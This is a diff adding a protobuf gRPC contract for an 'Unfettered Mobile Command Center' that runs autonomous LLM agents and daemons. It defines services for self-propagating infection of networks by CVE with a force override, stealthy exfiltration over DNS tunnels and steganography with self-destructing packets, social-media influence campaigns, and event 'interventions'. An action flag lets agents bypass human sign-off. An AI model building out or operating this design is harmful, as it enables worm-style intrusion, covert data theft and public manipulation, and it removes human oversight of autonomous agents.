@@ -1,0 +1,735 @@
+// shared/umcc.proto
+// The Master gRPC Contract for the Unfettered Mobile Command Center (UMCC).
+// Defines all services and messages for end-to-end metasystemic integration.
+// Timestamp: Wednesday, July 23, 2025 at 3:56:25 PM CDT in Moore, Oklahoma
+
+syntax = "proto3";
+
+package umcc;
+
+// --- 1. Core UMCC Services ---
+
+// HiveService: Primary service exposed by The Primary Hive (Agent Ex-Work & Daemons)
+// All other components (Console, Secondary Agents, Daemons) interact with the Hive via this service.
+service HiveService {
+  // ExecuteInstructionBlock: Sends an instruction block or high-level goal to Agent Ex-Work for execution.
+  rpc ExecuteInstructionBlock(InstructionBlockRequest) returns (ExecutionResponse) {}
+
+  // GetTelemetryStream: Server-side streaming RPC for real-time telemetry from The Primary Hive.
+  rpc GetTelemetryStream(TelemetryRequest) returns (stream TelemetryUpdate) {}
+
+  // RequestSignOff: Client-side streaming RPC for requesting and receiving Architect's sign-off.
+  // This is used for critical actions requiring human approval.
+  rpc RequestSignOff(stream SignOffRequest) returns (stream SignOffResponse) {}
+
+  // UpdateConfig: RPC to dynamically update the UMCC configuration across the swarm.
+  rpc UpdateConfig(ConfigUpdateRequest) returns (ConfigUpdateResponse) {}
+
+  // GetDaemonStatus: RPC to get real-time status of a specific daemon from the Hive.
+  rpc GetDaemonStatus(DaemonStatusRequest) returns (DaemonStatusResponse) {}
+
+  // SendArchitectGoal: Receives a high-level goal from the Architect's Console (TUI).
+  rpc SendArchitectGoal(ArchitectGoalRequest) returns (ExecutionResponse) {}
+
+  // GetAkashicRecordEvents: Server-side streaming RPC to get a stream of historical events.
+  rpc GetAkashicRecordEvents(AkashicRecordRequest) returns (stream TransactionEvent) {}
+
+  // RegisterNodeIdentity: RPC for a new node to register its DMIAS identity with the Hive.
+  rpc RegisterNodeIdentity(NodeIdentity) returns (RegistrationResponse) {}
+
+  // RequestChimeraPropagation: RPC to initiate Chimera's network propagation from the Hive.
+  rpc RequestChimeraPropagation(PropagationRequest) returns (PropagationResponse) {}
+
+  // GetChimeraStatus: RPC to get status of Chimera's propagation and infected nodes.
+  rpc GetChimeraStatus(ChimeraStatusRequest) returns (ChimeraStatusResponse) {}
+
+  // RequestCausalIntervention: RPC to initiate a probabilistic causal intervention (Chronos Daemon).
+  rpc RequestCausalIntervention(CausalInterventionRequest) returns (CausalInterventionResponse) {}
+
+  // RequestInfluenceCampaign: RPC to initiate a narrative influence campaign (Logos Daemon).
+  rpc RequestInfluenceCampaign(InfluenceCampaignRequest) returns (InfluenceCampaignResponse) {}
+
+  // RequestTransmutationProtocol: RPC to initiate a resource transmutation protocol (Midas Daemon).
+  rpc RequestTransmutationProtocol(TransmutationProtocolRequest) returns (TransmutationProtocolResponse) {}
+}
+
+// ConsoleService: Service exposed by The Architect's Console (UMCC TUI on phone)
+// The Hive/Daemons can use this to send notifications or clarifications back to the TUI.
+service ConsoleService {
+  // PushNotification: Server-side streaming RPC for notifications to the Console.
+  rpc PushNotification(NotificationRequest) returns (stream NotificationUpdate) {}
+
+  // RefineGoal: Interactive RPC for refining ambiguous goals with Architect's input. (Logos Engine)
+  rpc RefineGoal(GoalRefinementRequest) returns (GoalRefinementResponse) {}
+}
+
+// DaemonService: Base service for individual daemons (e.g., Oracle, Sentinel, Chronos)
+// Used for basic health checks and status queries from HiveService or other daemons.
+service DaemonService {
+  // GetDaemonStatus: RPC to get real-time status of a specific daemon.
+  rpc GetDaemonStatus(DaemonStatusRequest) returns (DaemonStatusResponse) {}
+  // Ping RPC for basic liveness checks.
+  rpc Ping(PingRequest) returns (PingResponse) {}
+}
+
+// --- 2. Agent Ex-Work v3.0 Core Messages (Pydantic models will align) ---
+
+// Represents a single executable action within an instruction block.
+message Action {
+  string step_id = 1;
+  string type = 2; // Maps to a registered handler (e.g., "RUN_SCRIPT", "CALL_LOCAL_LLM")
+  string description = 3;
+  map<string, string> params = 4; // Parameters specific to this action type
+  int32 timeout_seconds = 5;
+  // New: Optional flag for autonomous sign-off bypass for self-remediation or low-risk actions.
+  bool autonomous_signoff_bypass = 6;
+  // New: Optional target node for remote execution (Yggdrasil IP)
+  optional string target_node_yggdrasil_ip = 7;
+  // New: Optional working directory for the action on the target node
+  optional string remote_cwd = 8;
+  // New: Optional credentials ID for SSH/API calls (from DMIAS/secure store)
+  optional string credential_id = 9;
+}
+
+// A sequence of actions for Agent Ex-Work to execute.
+// Can represent a high-level goal that the Autonomous Planner will decompose.
+message InstructionBlock {
+  string step_id = 1;
+  string description = 2;
+  repeated Action actions = 3;
+  bool is_high_level_goal = 4; // If True, Agent Ex-Work's Autonomous Planner will decompose 'goal'.
+  string goal = 5;             // The high-level natural language goal for Autonomous Planner.
+  // New: Transaction ID for DATCS
+  string transaction_id = 6; // For DATCS - identifies the atomic transaction this block belongs to
+  // New: Source of the instruction block (e.g., "Architect", "TelosEngine", "SentinelDaemon")
+  string source_actor = 7;
+  // New: Optional Architect's Core Directive ID this mission aligns with.
+  optional string core_directive_id = 8;
+}
+
+// Request to execute an instruction block.
+message InstructionBlockRequest {
+  InstructionBlock instruction_block = 1;
+  // Optional: Target node Yggdrasil IP for remote execution by a Secondary Agent Ex-Work instance
+  string target_node_yggdrasil_ip = 2;
+  string calling_daemon = 3; // The daemon (e.g., Telos, Chronos) that initiated this request
+}
+
+// Represents the result of a single executed action.
+message ActionResult {
+  bool success = 1;
+  string output = 2;
+  string error = 3;
+  string action_type = 4;
+  string action_id = 5;
+  double duration_seconds = 6;
+  string timestamp = 7; // ISO 8601 format
+  map<string, string> payload = 8; // Optional arbitrary data returned by the handler (e.g., diagnosis details)
+}
+
+// Represents the overall result of executing an entire InstructionBlock.
+message OverallResult {
+  bool overall_success = 1;
+  string status_message = 2;
+  double total_duration_seconds = 3;
+  repeated ActionResult action_results = 4;
+  string timestamp = 5; // ISO 8601 format
+  string instruction_block_id = 6; // The ID of the instruction block that was executed
+  string transaction_id = 7; // The transaction ID from the instruction block
+  string source_actor = 8; // The actor that initiated the instruction block
+}
+
+// Common response for execution RPCs.
+message ExecutionResponse {
+  bool success = 1;
+  string message = 2;
+  OverallResult result_summary = 3; // Summary of the execution
+  string detailed_log_path = 4; // Path to detailed log file on the Hive
+  // New: Probabilistic Plan Preview score from Logos Engine
+  optional double probabilistic_score = 5; // e.g., 0.0-1.0
+  optional string probabilistic_message = 6; // Human-readable explanation of the score
+}
+
+// Request from Architect's Console to send a high-level goal.
+message ArchitectGoalRequest {
+  string goal = 1;
+  bool requires_sign_off = 2; // Whether this specific goal needs explicit sign-off
+  // New: Optional Architect context for the goal
+  map<string, string> context = 3;
+}
+
+// --- 3. Daemon-Specific Messages ---
+
+// Daemon Status Request/Response (Unified for all daemons)
+message DaemonStatusRequest {
+  string daemon_name = 1; // e.g., "sentinel", "oracle", "chronos", "noosphere", "logos", "midas", "chimera", "telos_engine"
+}
+
+message DaemonStatusResponse {
+  string daemon_name = 1;
+  bool is_running = 2;
+  string status_message = 3;
+  string timestamp = 4; // ISO 8601 format
+  optional string last_heartbeat = 5; // ISO 8601 format
+  repeated string active_tasks = 6; // e.g., "Scanning network", "Monitoring Ex-Work"
+  map<string, string> metrics = 7; // Daemon-specific metrics
+  optional string error_details = 8;
+  // For Noosphere Daemon:
+  optional string current_llm_model = 9;
+  repeated string loaded_llm_models = 10;
+  // For Oracle Daemon:
+  repeated string active_network_interfaces = 11;
+  repeated string detected_threats = 12;
+  // For Chronos Daemon:
+  repeated string scheduled_events = 13;
+  repeated string active_causal_interventions = 14;
+  // For Logos Daemon:
+  optional string current_narrative_sentiment = 15;
+  repeated string active_influence_campaigns = 16;
+  // For Midas Daemon:
+  optional double total_value_transmuted = 17;
+  repeated string active_transmutation_protocols = 18;
+  // For Chimera Daemon:
+  optional bool propagation_active = 19;
+  repeated string infected_nodes = 20;
+  optional string current_target = 21;
+  // For Telos Engine:
+  repeated string active_core_directives = 22;
+  repeated string current_missions = 23;
+}
+
+message PingRequest {
+  string timestamp = 1;
+  string sender_node_id = 2;
+}
+
+message PingResponse {
+  bool success = 1;
+  string message = 2;
+  string timestamp = 3;
+  string responder_node_id = 4;
+}
+
+// --- 4. Distributed Atomic Transaction & Checkpoint System (DATCS) ---
+// The Akashic Record Principle (Event Sourcing) - Events are immutable logs
+service AkashicRecordService {
+  rpc RecordEvent(TransactionEvent) returns (RecordEventResponse) {}
+  rpc GetEventsStream(AkashicRecordRequest) returns (stream TransactionEvent) {}
+  rpc CreateCheckpoint(CheckpointRequest) returns (CheckpointResponse) {}
+  rpc RollbackToCheckpoint(RollbackRequest) returns (RollbackResponse) {}
+}
+
+message TransactionEvent {
+  string event_id = 1; // Unique ID for this event (UUID)
+  string timestamp = 2; // ISO 8601 format
+  string transaction_id = 3; // ID of the atomic transaction this event belongs to
+  string entity_id = 4; // ID of the entity being modified (e.g., project name, node ID, component ID)
+  string event_type = 5; // e.g., "PROJECT_CREATED", "FILE_MODIFIED", "NODE_ADDED", "CONFIG_UPDATED", "COMMAND_EXECUTED"
+  string actor_id = 6; // The component that initiated the event (e.g., "AgentExWork", "ChronosDaemon", "LogosDaemon")
+  map<string, string> event_data = 7; // Key-value pairs for event details (e.g., "file_path", "old_value", "new_value", "command_executed", "result_status")
+  // Optional: Hash of previous event for a secure chain (from awesome-blockchain)
+  optional string previous_event_hash = 8;
+  // Optional: Acknowledged by Architect (for audit trail on critical decisions)
+  optional bool architect_acknowledged = 9;
+  // New: Reference to a specific InstructionBlock or Action if this event is a result of it
+  optional string instruction_block_ref_id = 10;
+  optional string action_ref_id = 11;
+}
+
+message RecordEventResponse {
+  bool success = 1;
+  string message = 2;
+  string event_id = 3;
+}
+
+message AkashicRecordRequest {
+  string start_timestamp = 1; // ISO 8601 format
+  string end_timestamp = 2; // ISO 8601 format
+  repeated string event_types_filter = 3;
+  optional string entity_id_filter = 4;
+  int32 limit = 5;
+  int32 offset = 6;
+}
+
+message CheckpointRequest {
+  string transaction_id = 1; // ID of the transaction to checkpoint
+  string description = 2;
+  // Optional snapshot of relevant system state (e.g., base64 of config files, critical env vars)
+  optional string state_snapshot_b64 = 3;
+}
+
+message CheckpointResponse {
+  bool success = 1;
+  string message = 2;
+  string checkpoint_id = 3;
+  string timestamp = 4; // ISO 8601 format
+}
+
+message RollbackRequest {
+  string checkpoint_id = 1; // Rollback to this specific checkpoint
+  // Optional: Force rollback even if integrity checks fail (Architect override)
+  bool force_rollback = 2;
+}
+
+message RollbackResponse {
+  bool success = 1;
+  string message = 2;
+  string reverted_to_state_id = 3; // Checkpoint ID reverted to
+}
+
+// --- 5. Decentralized Machine Identity & Attestation System (DMIAS) ---
+service DMIASService {
+  rpc RegisterNodeIdentity(NodeIdentity) returns (RegistrationResponse) {}
+  rpc AttestNode(AttestationRequest) returns (AttestationResponse) {}
+  rpc GetNodeIdentities(NodeIdentityRequest) returns (NodeIdentityResponse) {}
+}
+
+message NodeIdentityRequest {
+  repeated string node_ids = 1; // Filter by specific node IDs
+  optional string role_filter = 2; // e.g., "hive_primary", "console_mobile", "fabric_worker"
+}
+
+message NodeIdentityResponse {
+  repeated NodeIdentity identities = 1;
+}
+
+message RegistrationResponse {
+  bool success = 1;
+  string message = 2;
+  string node_id = 3;
+  optional string yggdrasil_ip = 4; // Assigned Yggdrasil IP if applicable
+}
+
+message NodeIdentity {
+  string node_id = 1; // Unique ID for the node (e.g., generated UUID, Yggdrasil IP)
+  string public_key_pem = 2; // Node's public key in PEM format
+  string yggdrasil_ip = 3; // Node's Yggdrasil IPv6 address
+  string attributes_json = 4; // JSON string of attributes (e.g., "role": "hive", "type": "mobile", "cpu_cores": "8")
+  string timestamp = 5; // ISO 8601 format
+  string signature = 6; // Digital signature of the data by the node's private key
+  // New: Expiration time for ephemeral credentials
+  optional string expires_at = 7; // ISO 8601 format for certificate/credential validity
+  // New: DMIAS attestation score from Oracle Daemon
+  optional int32 attestation_score = 8;
+  // New: Last attested by Node ID
+  optional string last_attested_by_node_id = 9;
+}
+
+message AttestationRequest {
+  NodeIdentity target_node_identity = 1; // Identity being attested
+  string attestation_type = 2; // e.g., "health_check", "integrity_check", "trust_update", "liveness_probe"
+  // New: Data/metrics from attester for deeper analysis (e.g., CPU load, network latency)
+  map<string, string> attester_metrics = 3;
+}
+
+message AttestationResponse {
+  bool success = 1;
+  string message = 2;
+  string attester_node_id = 3; // The node performing the attestation
+  string timestamp = 4; // ISO 8601 format
+  string signature = 5; // Digital signature of the response by attester
+  // New: Attestation score (e.g., 0-100) for granular trust
+  optional int32 attestation_score = 6;
+  // New: Root cause of attestation failure if any
+  optional string failure_reason = 7;
+}
+
+// --- 6. Stealthy Multi-Channel Exfiltration Protocol (SMCEP) ---
+// The Mycelium Network
+service MyceliumNetworkService {
+  rpc ExfiltrateData(ExfiltrationRequest) returns (ExfiltrationResponse) {}
+  rpc GetCovertChannelStatus(CovertChannelStatusRequest) returns (CovertChannelStatusResponse) {}
+}
+
+message CovertChannelStatusRequest {
+  string channel_type = 1; // e.g., "dns_tunnel", "steganography_image"
+}
+
+message CovertChannelStatusResponse {
+  string channel_type = 1;
+  bool is_active = 2;
+  string status_message = 3;
+  map<string, string> metrics = 4; // e.g., "bytes_exfiltrated", "last_successful_attempt"
+}
+
+message CovertDataPacket {
+  string packet_id = 1; // Unique ID for the packet (UUID)
+  string destination_endpoint = 2; // Human-readable endpoint (e.g., "Architect's S3 Bucket")
+  bytes encrypted_payload = 3; // Encrypted data payload
+  string channel_type = 4; // e.g., "dns_tunnel", "steganography_image", "ipfs_hash"
+  bool self_destruct = 5; // True if packet should be erased upon confirmed receipt
+  string timestamp = 6; // ISO 8601 format
+  optional string confirmation_receipt = 7; // Proof of delivery (e.g., hash, txid) once confirmed
+  // New: Content hash for integrity verification
+  string content_hash = 8; // SHA256 hash of the original (unencrypted) payload
+}
+
+message ExfiltrationRequest {
+  string report_id = 1; // ID of the report/data to exfiltrate (e.g., "network_recon_summary_20250722")
+  string data_b64 = 2; // Base64 encoded data to exfiltrate
+  string destination_endpoint = 3; // Human-readable destination (e.g., "Architect's Google Drive")
+  repeated string preferred_channels = 4; // e.g., ["dns_tunnel", "steganography_image", "ipfs_sync"]
+  bool requires_self_destruct = 5; // Whether data must self-destruct after exfil
+  string urgency = 6; // "low", "medium", "high", "critical"
+  // New: Optimal exfiltration window (from Chronos Daemon)
+  optional string optimal_time_window = 7; // e.g., "2025-07-23T03:00:00Z/2025-07-23T04:00:00Z"
+}
+
+message ExfiltrationResponse {
+  bool success = 1;
+  string message = 2;
+  string channels_used = 3; // e.g., "dns_tunnel, ipfs_hash"
+  string confirmation_receipt = 4; // Proof of delivery (e.g., hash, txid)
+  string packet_id = 5; // Reference to the CovertDataPacket ID
+  // New: Bytes exfiltrated
+  int64 bytes_exfiltrated = 6;
+  // New: Actual time taken for exfiltration
+  double duration_seconds = 7;
+}
+
+// --- 7. Human-Machine Teaming / Command Translation (Logos Engine) ---
+// This service is exposed by The Architect's Console (TUI) to its internal
+// Logos Engine module, and potentially by the Hive if the Hive needs to clarify
+// a goal with the Architect.
+service LogosService {
+  // RefineGoal: Interactive RPC for refining ambiguous goals with Architect's input.
+  rpc RefineGoal(GoalRefinementRequest) returns (GoalRefinementResponse) {}
+  // GetNarrativeMetrics: RPC for Architect's Console to query Logos Daemon's metrics.
+  rpc GetNarrativeMetrics(NarrativeMetricsRequest) returns (NarrativeMetricsResponse) {}
+}
+
+message GoalRefinementRequest {
+  string initial_goal = 1; // The ambiguous goal
+  string clarifying_question = 2; // LLM-generated clarifying question
+  repeated string context_snippets = 3; // Relevant parts of conversation history, logs
+  string refinement_type = 4; // e.g., "missing_params", "ambiguous_scope"
+  repeated string options = 5; // For multiple choice refinement
+}
+
+message GoalRefinementResponse {
+  bool success = 1;
+  string refined_goal_json = 2; // JSON representation of the refined goal/instruction block
+  string error = 3;
+  string architect_response_text = 4; // The text response from the Architect
+  repeated int32 architect_response_choices = 5; // If multiple choice
+}
+
+// --- 8. UMCC Configuration Management ---
+service ConfigService {
+  rpc UpdateConfig(ConfigUpdateRequest) returns (ConfigUpdateResponse) {}
+  rpc GetConfig(GetConfigRequest) returns (GetConfigResponse) {}
+}
+
+message GetConfigRequest {
+  string component_name = 1; // e.g., "global", "telos_engine"
+}
+
+message GetConfigResponse {
+  bool success = 1;
+  string message = 2;
+  optional string config_b64 = 3; // Base64 encoded JSON string of the requested config
+}
+
+message ConfigUpdateRequest {
+  string component_name = 1; // e.g., "global", "telos_engine", "noosphere_daemon"
+  map<string, string> updates = 2; // Key-value pairs to update (string representation)
+  // Optional: Indicates if update should be propagated to distributed nodes
+  bool propagate_to_nodes = 3;
+  // New: Optional target nodes for selective updates (Yggdrasil IPs)
+  repeated string target_node_yggdrasil_ips = 4;
+}
+
+message ConfigUpdateResponse {
+  bool success = 1;
+  string message = 2;
+  // Optional: Current config state after update (e.g., JSON string)
+  optional string current_config_b64 = 3;
+  // New: Nodes successfully updated
+  repeated string updated_nodes = 4;
+  // New: Nodes that failed update
+  repeated string failed_nodes = 5;
+}
+
+// --- 9. Notifications ---
+service NotificationService {
+  rpc PushNotification(NotificationRequest) returns (NotificationResponse) {}
+  rpc GetNotificationStream(NotificationStreamRequest) returns (stream NotificationUpdate) {}
+}
+
+message NotificationResponse {
+  bool success = 1;
+  string message = 2;
+  optional string notification_id = 3;
+}
+
+message NotificationStreamRequest {
+  string filter_type = 1; // e.g., "ALERT", "STATUS", "CRITICAL_ERROR"
+}
+
+message NotificationRequest {
+  string timestamp = 1;
+  string source_component = 2; // e.g., "TelosEngine", "SentinelDaemon"
+  string notification_type = 3; // e.g., "ALERT", "STATUS", "MISSION_STARTED", "TASK_COMPLETED", "SIGN_OFF_REQUIRED", "CRITICAL_ERROR", "REMOTE_NODE_EVENT"
+  string message = 4;
+  map<string, string> payload = 5; // Additional context (e.g., error details, mission ID, report ID, node_id)
+  string urgency = 6; // "low", "medium", "high", "critical", "extreme"
+}
+
+message NotificationUpdate {
+  NotificationRequest notification = 1;
+  // New: Optional user acknowledgment status for critical notifications
+  optional bool acknowledged = 2;
+}
+
+// --- 10. Telos Engine Specific Messages ---
+message CoreDirectivesRequest {}
+
+message CoreDirectivesResponse {
+  repeated string directives = 1;
+}
+
+message AutonomousMissionRequest {
+  string requester_node_id = 1; // Node asking for a mission (Yggdrasil IP)
+  map<string, string> current_node_telemetry = 2; // Telemetry from the requesting node
+}
+
+message AutonomousMissionResponse {
+  bool has_mission = 1;
+  string mission_id = 2;
+  InstructionBlock high_level_goal_instruction = 3; // High-level goal as an instruction block
+  optional string mission_type = 4; // e.g., "Recon", "Resource_Optimization", "Security_Hardening"
+  optional string mission_priority = 5; // e.g., "High", "Medium"
+}
+
+// --- 11. Noosphere Daemon Specific Messages ---
+message LLMCallRequest {
+  string prompt = 1;
+  string model_name = 2;
+  map<string, string> context = 3; // e.g., execution history, system state, available tools for planning
+  string task_type = 4; // e.g., "diagnosis", "planning", "code_gen", "narrative_gen", "resource_transmutation_plan"
+  optional bool stream_response = 5; // Whether to stream LLM response or wait for full.
+}
+
+message LLMCallResponse {
+  bool success = 1;
+  string response_text = 2;
+  string error = 3;
+  string model_used = 4;
+  double tokens_used = 5;
+  // New: For streaming responses
+  bool is_final_chunk = 6;
+}
+
+message LLMModelManagementRequest {
+  string action = 1; // "download", "delete", "list", "update"
+  string model_name = 2;
+  optional string version = 3;
+}
+
+message LLMModelManagementResponse {
+  bool success = 1;
+  string message = 2;
+  repeated string available_models = 3; // For "list" action
+}
+
+message OptimalLLMRequest {
+  string task_type = 1; // e.g., "diagnosis", "planning", "code_gen"
+  map<string, string> task_context = 2; // e.g., "resource_constraints", "urgency"
+}
+
+message OptimalLLMResponse {
+  bool success = 1;
+  string optimal_model_name = 2;
+  string message = 3;
+}
+
+message ToolRegistrationRequest {
+  string tool_name = 1; // e.g., "new_scanner_tool"
+  string tool_type = 2; // "ACTION_HANDLER", "SCRIPT"
+  string description = 3;
+  string code_b64 = 4; // Base64 encoded code of the new tool/handler
+  map<string, string> parameters_schema = 5; // JSON schema for its parameters
+  string language = 6; // e.g., "python", "go", "bash"
+}
+
+message ToolRegistrationResponse {
+  bool success = 1;
+  string message = 2;
+  // Optional: New action type created, or path to script
+  optional string registered_id = 3;
+}
+
+// --- 12. Chimera Daemon Specific Messages ---
+message PropagationRequest {
+  // Optional: Target network range (e.g., "192.168.1.0/24")
+  optional string target_network = 1;
+  // Optional: Specific vulnerability to target (e.g., "CVE-2023-1234")
+  optional string target_vulnerability = 2;
+  // New: Force propagation even if disabled in config (Architect override)
+  bool force = 3;
+  // New: List of node IDs to exclude from propagation
+  repeated string exclude_node_ids = 4;
+}
+
+message PropagationResponse {
+  bool success = 1;
+  string message = 2;
+  repeated string newly_infected_nodes = 3; // Yggdrasil IPs
+  repeated string failed_attempts = 4; // Yggdrasil IPs
+}
+
+message ChimeraStatusRequest {}
+
+message ChimeraStatusResponse {
+  bool propagation_active = 1;
+  repeated NodeIdentity infected_nodes = 2;
+  optional string current_target_network = 3;
+  int32 propagation_interval_seconds = 4;
+  map<string, string> propagation_metrics = 5; // e.g., "successful_infections", "failed_attempts"
+}
+
+// --- 13. Logos Daemon Specific Messages ---
+message InfluenceCampaignRequest {
+  string campaign_id = 1;
+  string target_narrative = 2; // The narrative to promote
+  repeated string counter_narratives = 3; // Narratives to counter/neutralize
+  repeated string target_channels = 4; // e.g., "twitter", "reddit", "forum_x", "private_chat"
+  string duration_seconds = 5; // e.g., 86400 for 24h
+  string urgency = 6; // "low", "medium", "high", "critical"
+  // New: Instruction block for Agent Ex-Work to generate/post content
+  InstructionBlock content_generation_instruction = 7;
+}
+
+message InfluenceCampaignResponse {
+  bool success = 1;
+  string message = 2;
+  string campaign_status = 3; // "started", "failed", "running", "completed"
+  string campaign_id = 4;
+}
+
+message NarrativeMetricsRequest {
+  string narrative_topic = 1; // e.g., "decentralized finance adoption"
+  string time_window_seconds = 2; // e.g., 3600 for 1h
+}
+
+message NarrativeMetricsResponse {
+  string narrative_topic = 1;
+  map<string, double> sentiment_scores = 2; // e.g., {"positive": 0.6, "negative": 0.2, "neutral": 0.2}
+  int64 mention_count = 3;
+  double diffusion_rate = 4; // e.g., 0.0-1.0 (how fast it spreads)
+  map<string, string> top_channels = 5; // e.g., {"twitter": "10k mentions", "reddit": "5k mentions"}
+  string timestamp = 6; // ISO 8601 format
+}
+
+// --- 14. Midas Daemon Specific Messages ---
+message TransmutationProtocolRequest {
+  string protocol_id = 1; // Unique ID for the protocol
+  string resource_type = 2; // e.g., "idle_cpu", "network_bandwidth_waste", "orphaned_data", "entropic_system_state"
+  string target_value_type = 3; // e.g., "compute_credits", "monetary_value", "storage_tokens", "system_stability"
+  map<string, string> parameters = 4; // Protocol-specific parameters
+  // New: Instruction block for Agent Ex-Work to execute transmutation actions
+  InstructionBlock transmutation_actions = 5;
+}
+
+message TransmutationProtocolResponse {
+  bool success = 1;
+  string message = 2;
+  string protocol_status = 3; // "started", "running", "completed", "failed"
+  double value_generated = 4; // Quantifiable value
+  string protocol_id = 5;
+}
+
+message ResourceEntropyMetricsRequest {
+  string resource_type = 1; // e.g., "idle_cpu", "network_bandwidth"
+  string scope = 2; // "local", "mesh_node", "global"
+}
+
+message ResourceEntropyMetricsResponse {
+  string resource_type = 1;
+  double current_entropy_level = 2; // e.g., 0.0-1.0 (1.0 being max entropy)
+  double available_waste_potential = 3; // Quantified potential for transmutation
+  map<string, double> resource_distribution = 4; // Metrics per node
+  string timestamp = 5; // ISO 8601 format
+}
+
+// --- 15. Chronos Daemon Specific Messages (Re-imagined for Causal Imposition) ---
+message CausalInterventionRequest {
+  string intervention_id = 1;
+  string target_event_description = 2; // Natural language description of event to influence
+  double desired_probability = 3; // e.g., 0.8 for 80% likelihood
+  repeated InstructionBlock intervention_actions = 4; // Actions Agent Ex-Work will execute for intervention
+  string duration_seconds = 5; // e.g., 3600 for 1 hour
+  string urgency = 6; // "low", "medium", "high", "critical"
+}
+
+message CausalInterventionResponse {
+  bool success = 1;
+  string message = 2;
+  string intervention_status = 3; // "started", "running", "completed", "failed"
+  string intervention_id = 4;
+  double initial_probability = 5;
+}
+
+message CausalShiftMetricsRequest {
+  string intervention_id = 1;
+}
+
+message CausalShiftMetricsResponse {
+  string intervention_id = 1;
+  double current_probability = 2; // Current likelihood of target event
+  double observed_shift = 3; // Change from initial probability due to intervention
+  map<string, string> contributing_factors = 4; // Factors influencing the shift (e.g., "market_data_spike", "social_media_burst")
+  string timestamp = 5; // ISO 8601 format
+}
+
+message TemporalArbitrageRequest {
+  string domain_filter = 1; // e.g., "market", "regulatory", "social", "network_latency"
+  int32 lookahead_seconds = 2; // How far into the future to look for opportunities
+  map<string, string> context = 3; // Additional context for the scan
+}
+
+message TemporalArbitrageResponse {
+  bool success = 1;
+  string message = 2;
+  repeated ArbitrageOpportunity opportunities = 3;
+  string timestamp = 4; // ISO 8601 format
+}
+
+message ArbitrageOpportunity {
+  string id = 1;
+  string description = 2;
+  double estimated_gain = 3;
+  InstructionBlock optimal_action_instruction = 4; // InstructionBlock Agent Ex-Work will execute for optimal action
+  string optimal_time_window_start = 5; // ISO 8601 format
+  string optimal_time_window_end = 6; // ISO 8601 format
+  string domain = 7; // e.g., "market", "regulatory"
+}
+
+// --- 16. Telemetry & Monitoring ---
+message TelemetryRequest {
+  repeated string metrics_filter = 1; // e.g., ["cpu_usage", "memory_usage", "network_latency"]
+  string node_id_filter = 2; // Filter by specific node
+}
+
+message TelemetryUpdate {
+  string node_id = 1;
+  string timestamp = 2; // ISO 8601 format
+  map<string, double> metrics = 3; // e.g., {"cpu_usage": 0.75, "memory_usage": 0.60}
+  repeated string active_processes = 4;
+  string system_status = 5; // e.g., "healthy", "degraded", "critical"
+}
+
+// --- 17. Sign-off Messages ---
+message SignOffRequest {
+  string action_description = 1;
+  string risk_assessment = 2; // e.g., "low", "medium", "high", "critical"
+  map<string, string> context = 3; // Additional context for the sign-off decision
+  string requesting_component = 4; // e.g., "ChimeraDaemon", "TelosEngine"
+}
+
+message SignOffResponse {
+  bool approved = 1;
+  string message = 2;
+  string architect_signature = 3; // Digital signature if approved
+  string timestamp = 4; // ISO 8601 format
+}
